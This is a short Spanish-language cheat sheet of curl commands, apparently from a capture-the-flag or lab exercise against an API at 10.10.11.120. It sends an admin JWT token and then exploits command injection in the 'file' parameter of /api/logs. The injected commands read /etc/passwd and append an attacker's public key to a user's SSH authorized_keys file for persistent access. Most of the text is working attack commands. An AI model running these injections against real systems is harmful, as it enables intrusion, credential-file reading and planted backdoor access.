## Enviar autenticacion con tokens

*Nota: El -h significa HEADER*

	curl -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWJiYTJmOGRhMTBjNzA0NjFjNWY2OGIiLCJuYW1lIjoiZWxsaW90IiwiZW1haWwiOiJlbGxpb3RAZ21haWwuY29tIiwiaWF0IjoxNjM5Njg3MjM0fQ.lRpWXAk9QdZv_1lKlRw8zagXjhBWaZ66SSn0HwBGp60' http://10.10.11.120:3000/api/priv

## Envenenar variables de entorno API
*nota: ?file=index.js es el archivo principal al cual mandaremos comandos*
*Para concatenar usaremos el ; para separar del script principal*
*El comando sed 's/\\n/\n/g' sirve para darle un formato mas amigable*

	curl -X GET -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWJmZDQ1MTgwOTYxNDA0NjQxMWE5NmMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjM5OTYxOTk2fQ.Z3GHUPK4y6nZ8oThGuuCLHLOSaXGWuBsd8zCTxTgFdI' 'http://10.10.11.120:3000/api/logs?file=index.js;cat+/etc/passwd' | sed 's/\\n/\n/g'

## Enviar comandos encodeados en formato URL
	curl -i -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWJmZDQ1MTgwOTYxNDA0NjQxMWE5NmMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjM5OTYxOTk2fQ.Z3GHUPK4y6nZ8oThGuuCLHLOSaXGWuBsd8zCTxTgFdI' -G --data-urlencode "file=index.js; mkdir -p /home/dasith/.ssh; echo $PUBLIC_KEY >> /home/dasith/.ssh/authorized_keys" 'http://10.10.11.120/api/logs'

## Enviar un user-agent personalizado
`$ curl -A "user-agent" -L http://10.10.20.15/`
